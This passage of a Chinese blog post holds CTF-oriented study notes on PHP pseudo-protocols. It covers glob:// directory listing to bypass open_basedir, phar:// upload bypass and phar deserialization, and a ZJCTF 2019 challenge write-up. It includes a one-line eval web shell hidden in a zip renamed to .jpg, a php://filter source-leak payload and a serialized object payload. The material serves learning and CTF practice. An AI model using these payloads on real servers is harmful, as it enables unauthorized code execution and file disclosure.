  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以下三种payload，都可以将扫描结果输出，绝对路径|相对路径都可以</span></span><br><span class="line">var_dump(scandir(<span class="string">&quot;glob:///*&quot;</span>));</span><br><span class="line">print_r(scandir(<span class="string">&quot;glob://./*&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> json_encode(scandir(<span class="string">&quot;glob://../*&quot;</span>));</span><br><span class="line"><span class="comment">#  以下是学长的碎碎念</span></span><br><span class="line"><span class="comment"># （关键在于 scandir() + glob伪协议</span></span><br><span class="line"><span class="comment"># （不过实际上也可以用别的方法来弄，这个涉及到CTF。。一般来说不会这么绝</span></span><br><span class="line"><span class="comment"># （比如 opendir 吧</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;glob:///*&#x27;</span>));</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<h3 id="DirectoryIterator-glob"><a href="#DirectoryIterator-glob" class="headerlink" title="DirectoryIterator+glob://"></a>DirectoryIterator+glob://</h3><p>  DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payloadL:</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">directoryiterator</span>(<span class="string">&quot;glob:///*&quot;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__tostring().<span class="string">&#x27; &#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#	glob:///*	会列出根目录下的文件</span></span><br><span class="line"><span class="comment"># 	glob://*	会列出open_basedir允许目录下的文件</span></span><br></pre></td></tr></table></figure>
<h3 id="opendir-readdir-glob"><a href="#opendir-readdir-glob" class="headerlink" title="opendir()+readdir()+glob://"></a>opendir()+readdir()+glob://</h3><p>  同样只能列出根目录已经open_basedir()允许的目录</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$b</span> = opendir(<span class="string">&#x27;glob:///*&#x27;</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="variable">$file</span> = readdir(<span class="variable">$b</span>)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><ul>
<li><p>phar:// — PHP 归档，将多个文件组合成一个文件</p>
</li>
<li><p>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响</p>
</li>
<li><p>运用：</p>
<p><strong>1、绕过上传限制</strong></p>
<p>可以利于phar://绕过一些上传限制，多数情况下搭配文件包含使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造木马shell.php-&gt;(压缩)xxx.zip-&gt;(修改后缀)xxx.jpg-&gt;上传-&gt;phar://xxx.jpg/shell.php</span></span><br><span class="line"><span class="number">1</span>、构造木马 shell.php: </span><br><span class="line">	<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span>、将shell.php压缩，并修改后缀名为jpg：xxx.jpg(实际是带有文件shell.php但修改了后缀名的压缩包)</span><br><span class="line"><span class="number">3</span>、上传xxx.jpg并配合文件包含解析木马（payload：<span class="string">&#x27;phar://xxx.jpg/shell.php&#x27;</span>）：</span><br><span class="line">	<span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&#x27;phar://xxx.jpg/shell.php&#x27;</span>);</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/25/xKtb5WPdZQJFaEN.png"></p>
<p><strong>2、phar反序列化漏洞</strong></p>
<ul>
<li><p>（ps : 也是反序列化漏洞，但无需借助unserialize()函数）</p>
</li>
<li><p>PHP反序列化漏洞通常是<strong>借助unserialize()函数</strong><br>但<strong>利用phar:// 伪协议</strong>也可以触发PHP反序列化漏洞：<br>1、phar文件以序列化的形式存储用户自定义的meta-data；<br>2、当使用phar://读取phar文件时，就会反序列化meta-data储存的信息</p>
</li>
<li><p><strong>利用条件</strong>：(ps:由此可以知道如何修复漏洞咯~)<br><code>可以上传phar文件</code><br><code>有可用魔术方法</code><br><code>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</code></p>
</li>
<li><p><strong>受影响的文件操作函数</strong>：(参考 zsx师傅<a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a>)可知：<br>除了<code>所有文件函数</code>，只要是函数的实现过程直接或间接调用了<code>php_stream_open_wrapper</code>的函数，都可能触发phar反序列化漏洞（具体看zsx师傅的博客，写的很明了~）<br><img src="https://i.loli.net/2021/02/25/MT25UaKWSXCAl9i.png" alt="源自创宇测试"></p>
</li>
<li><p>phar文件：<br>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p>
<ul>
<li><code>php&gt;=5.3</code>：默认开启支持<code>Phar</code>，文件状态为只读(<code>phar.readonly=on</code>)，而且使用phar文件不需要任何配置。php使用phar://伪协议来解析phar文件的内容。<br>ps：需<code>php.ini</code>中令 <code>phar.readonly=off</code>并去掉其前面的分号<code>;</code>否则无法生成phar文件</li>
</ul>
</li>
<li><p>phar文件结构：      </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> stub</span><br><span class="line">phar文件的标志，必须以 xxx <span class="comment"><span class="keyword">__HALT_COMPILER</span>();?&gt; 结尾，否则phar不会识别此部分。xxx可以为自定义内容。</span></span><br><span class="line"><span class="comment">2. manifest</span></span><br><span class="line"><span class="comment">phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分会以序列化的形式存储用户自定义的meta-data，这里是漏洞利用的关键所在,正是因为meta-data是以序列化的形式存储</span></span><br><span class="line"><span class="comment">3. content</span></span><br><span class="line"><span class="comment">被压缩文件的内容，通常情况下这里是可以随意输入的</span></span><br><span class="line"><span class="comment">4. signature (可空)</span></span><br><span class="line"><span class="comment">签名，放在末尾。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>demo:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Phar create done&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">#.phar文件，(后缀名必须为phar)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php  __HALT_COMPILER(); ?&gt;&quot;</span>);	<span class="comment">#stub(1)</span></span><br><span class="line"><span class="comment">#检测图片头时，可以添加gif头来绕过：GIF89a</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$o</span>-&gt;string = <span class="string">&quot;bphar&quot;</span>;<span class="comment">#类的属性</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);	<span class="comment">#将自定义的meta-data存入manifest(2)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;bphar.txt&quot;</span>,<span class="string">&quot;bphar&quot;</span>); <span class="comment">#添加压缩文件(3)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();	<span class="comment">#签名自动计算(4)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/25/QIKqF6MvL9Tif7x.png" alt="创建成功"><br><img src="https://i.loli.net/2021/02/25/w8cvt7eCQpHMbEj.png" alt="test.phar文件结构"><br>在使用Phar:// 协议流解析Phar文件时，Meta-data中的内容都会进行反序列化<br>(也就是phar文件中的反序列化部分)</p>
</li>
</ul>
</li>
<li><p>利用：</p>
<ol>
<li>上传phar文件，并借助phar://协议访问phar文件，从而将Meta-data中的内容反序列化</li>
<li>在创建时必须是phar后缀（$phar = new Phar(“exp.phar”); //.phar文件）<br>上传时为了绕过限制，则可以修改文件后缀、添加图片头从而达到上传的目的</li>
</ol>
</li>
</ul>
<h2 id="例题（data-、php-input、php-filter）"><a href="#例题（data-、php-input、php-filter）" class="headerlink" title="例题（data://、php://input、php://filter）"></a>例题（data://、php://input、php://filter）</h2><blockquote>
<p>[ZJCTF 2019]NiZhuanSiWei</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line"><span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>考点有三：</p>
<ol>
<li><p>绕过file_get_contents()<br>a、使用php://input伪协议绕过（需开启allow_url_include）<br>​    ① 将要<code>GET</code>的参数<code>?xxx=php://input</code><br>​    ② 用<code>post</code>方法传入<code>想要file_get_contents()函数返回的值</code></p>
<p><img src="https://i.loli.net/2021/02/24/EkFIO635YwAoiTm.png"></p>
<p> b、用data://伪协议绕过 ,<code>?text=data://text/plain,welcome to the zjctf</code><br>将url改为：<code>?xxx=data://text/plain;base64,(base64编码的内容)</code></p>
<pre><code>或    改为：`?xxx=data:text/plain,(url编码的内容)`</code></pre>
<p><img src="https://i.loli.net/2021/02/24/GD46ewrWXPJY9q2.png"></p>
</li>
<li><p>利用php://filter获取useless.php源码<br><code>php://filter/read=convert.base64-encode/resource=useless.php</code></p>
</li>
<li><p>反序列化获取flag<br><code>password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
</li>
</ol>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Na0H_1e3</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://na0hblog.top/2021/02/25/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">http://na0hblog.top/2021/02/25/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://na0hblog.top" target="_blank">Na0H的神光棒存放地</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></div><div class="post_share"><div class="social-share" data-image="/img/atimg/11.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/09/%E9%9A%8F%E4%BE%BF%E6%B3%A8blacklist%E5%BE%97%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/"><img class="prev-cover" src="/img/atimg/12.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">随便注|blacklist =&gt; 的一些知识</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/18/%E8%BF%91%E6%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A1%E5%88%92/"><img class="next-cover" src="/img/atimg/10.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">关于一些计划（的实施情况）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/05/15/misc入门/" title="misc入门"><img class="cover" src="/img/atimg/16.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-15</div><div class="title">misc入门</div></div></a></div><div><a href="/2021/04/21/web知识小记/" title="web知识小记（长期更|大概）"><img class="cover" src="/img/atimg/13.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-21</div><div class="title">web知识小记（长期更|大概）</div></div></a></div><div><a href="/2021/03/09/随便注blacklist得到的一些知识/" title="随便注|blacklist => 的一些知识"><img class="cover" src="/img/atimg/12.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-09</div><div class="title">随便注|blacklist => 的一些知识</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#file"><span class="toc-number">2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-%E3%80%81https"><span class="toc-number">2.2.</span> <span class="toc-text">http:&#x2F;&#x2F;、https:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip-amp-bzip2-amp-zlib"><span class="toc-number">2.3.</span> <span class="toc-text">zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data"><span class="toc-number">2.4.</span> <span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-number">2.5.</span> <span class="toc-text">php:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-fd"><span class="toc-number">2.5.1.</span> <span class="toc-text">php:&#x2F;&#x2F;fd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-memory-%E5%92%8C-php-temp"><span class="toc-number">2.5.2.</span> <span class="toc-text">php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-output"><span class="toc-number">2.5.3.</span> <span class="toc-text">php:&#x2F;&#x2F;output</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-number">2.5.4.</span> <span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter"><span class="toc-number">2.5.5.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">2.5.5.1.</span> <span class="toc-text">过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%E5%99%A8-string"><span class="toc-number">2.5.5.1.1.</span> <span class="toc-text">字符串过滤器(string.*)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8-convert"><span class="toc-number">2.5.5.1.2.</span> <span class="toc-text">转换过滤器(convert.*)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E8%BF%87%E6%BB%A4%E5%99%A8-zlib-bzip2"><span class="toc-number">2.5.5.1.3.</span> <span class="toc-text">压缩过滤器(zlib | bzip2.*)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">2.5.5.1.4.</span> <span class="toc-text">加密过滤器</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glob"><span class="toc-number">2.6.</span> <span class="toc-text">glob:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#scandir-glob"><span class="toc-number">2.6.1.</span> <span class="toc-text">scandir()+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DirectoryIterator-glob"><span class="toc-number">2.6.2.</span> <span class="toc-text">DirectoryIterator+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#opendir-readdir-glob"><span class="toc-number">2.6.3.</span> <span class="toc-text">opendir()+readdir()+glob:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar"><span class="toc-number">2.7.</span> <span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%88data-%E3%80%81php-input%E3%80%81php-filter%EF%BC%89"><span class="toc-number">2.8.</span> <span class="toc-text">例题（data:&#x2F;&#x2F;、php:&#x2F;&#x2F;input、php:&#x2F;&#x2F;filter）</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/wl.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Na0H_1e3</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">一点诚心，万缘俱息</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'zjCV2oT3ti8Lyk0insYTRpLr-gzGzoHsz',
      appKey: 'y4AXlgIqQsV7Enr3IFS3r6Ck',
      placeholder: '欢迎评论噢~',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="153,255,204" opacity="0.7" zIndex="-1" count="108" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script></div></body></html>